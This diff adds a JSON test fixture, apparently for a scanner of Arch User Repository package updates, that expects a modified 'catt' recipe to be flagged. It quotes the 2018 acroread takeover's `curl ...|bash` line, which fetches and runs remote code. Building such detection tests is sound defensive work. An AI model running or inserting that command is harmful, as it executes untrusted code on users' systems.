@@ -1,0 +1,12 @@
+{
+  "package": "catt",
+  "pkgbase": "catt",
+  "old": null,
+  "new": "0.13.3-1",
+  "expect": "flagged",
+  "source": "Models the July 2018 acroread orphan takeover, whose commit added a `curl -s https://ptpb.pw/~x|bash -&` line: https://lists.archlinux.org/pipermail/aur-general/2018-July/034151.html ; base recipe AUR catt commit 832f34616aba26531d35938d182e7c02f9654f68, https://aur.archlinux.org/cgit/aur.git/commit/?h=catt&id=832f34616aba26531d35938d182e7c02f9654f68; recipe licence: 0BSD (LICENSE in the AUR repository)",
+  "signal": "build() pipes a download from ptpb.invalid into bash",
+  "install": "none",
+  "installerRisk": false,
+  "recipe": "new"
+}
